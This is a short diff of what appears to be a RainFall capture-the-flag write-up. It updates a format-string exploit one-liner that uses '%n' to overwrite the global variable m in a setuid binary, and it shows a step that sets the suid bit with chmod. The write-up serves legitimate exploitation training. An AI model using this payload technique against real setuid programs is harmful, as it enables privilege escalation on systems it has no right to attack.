@@ -82,9 +82,9 @@ Edit permissions including suid, then move the binary to home directory.
 ```
 level5@RainFall:/tmp$ chmod u+s level4_source; chmod +wx ~; mv level4_source ~
 ```
-Exit back to user level4, then run the binary.
+Exit back to user level4, then run the source with an updated address of global variable ```m```.
 ```
 level5@RainFall:/tmp$ exit
 exit
-level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | /home/user/level5/level4_source
+level4@RainFall:~$ (python -c 'print "\x28\xa0\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | /home/user/level5/level4_source
 ```
